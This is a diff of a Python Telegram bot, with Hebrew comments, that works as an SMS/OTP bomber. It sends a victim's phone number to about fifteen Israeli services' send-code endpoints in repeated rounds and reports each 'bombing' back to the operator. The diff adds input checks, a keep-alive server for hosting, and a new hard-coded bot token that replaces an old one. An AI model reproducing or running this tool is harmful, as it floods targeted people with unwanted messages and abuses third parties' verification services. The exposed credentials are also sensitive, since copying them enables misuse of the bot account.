@@ -5,7 +5,7 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- שרת Flask לשמירה על הבוט פעיל ---
+# --- שרת Flask לשמירה על הבוט פעיל ב-Render ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Online"
@@ -14,11 +14,12 @@ def keep_alive():
     t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
     t.start()
 
-# --- הגדרת הבוט ---
-API_TOKEN = '8788411826:AAEJlmHnglSzcyUwEeTfFdhXIE1FNaw-2uA'
+# --- הגדרת הבוט עם הטוקן החדש ---
+API_TOKEN = '8788411826:AAFfeAOSNZLU49lpJGLY6X8p780GKicwe0U'
 bot = telebot.TeleBot(API_TOKEN)
 
 def attack(m, target, rounds):
+    # רשימת ה-15 המנצחת
     apis = [
         {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
         {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
@@ -45,25 +46,29 @@ def attack(m, target, rounds):
         for site in apis:
             try:
                 if site["type"] == "json":
-                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=4)
+                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
                 else:
-                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=4)
+                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
                 
-                if res.status_code in [200, 201]: round_success += 1
-                else: round_fail += 1
-            except: round_fail += 1
+                if res.status_code in [200, 201]:
+                    round_success += 1
+                else:
+                    round_fail += 1
+            except:
+                round_fail += 1
             
-            # --- הדיליי הקטן (0.1 שניות) ---
+            # --- דיליי מהיר של 0.1 שניות ---
             time.sleep(0.1)
         
         total_success += round_success
         total_fail += round_fail
-        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הסתיים!\n✅ הצלחות: {round_success} | ❌ כשלונות: {round_fail}")
+        
+        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {round_success} | ❌ נכשלו: {round_fail}")
         
         if r < int(rounds) - 1:
-            time.sleep(1.2) # השהייה קצרה בין סבבים למניעת חסימת IP
+            time.sleep(1.2)
 
-    bot.send_message(m.chat.id, f"🏁 **הפצצה הושלמה!**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ כשלונות: {total_fail}")
+    bot.send_message(m.chat.id, f"🏁 **סיכום הפצצה סופי:**\n📱 יעד: {target}\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")
 
 @bot.message_handler(func=lambda m: True)
 def handle(m):
@@ -71,9 +76,15 @@ def handle(m):
         parts = m.text.split()
         if len(parts) == 2:
             rounds, target = parts[0], parts[1]
-            bot.reply_to(m, f"🚀 יוצאים לדרך! {rounds} סבבים על {target}...")
-            attack(m, target, rounds)
-    except: pass
+            if rounds.isdigit() and target.isdigit() and len(target) >= 9:
+                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים על {target}...\n(15 אתרים פעילים!)")
+                attack(m, target, rounds)
+            else:
+                bot.reply_to(m, "פורמט: [סבבים] [מספר]")
+        else:
+            bot.reply_to(m, "לדוגמה: 2 0521234567")
+    except:
+        bot.reply_to(m, "שגיאה.")
 
 if __name__ == "__main__":
     keep_alive()
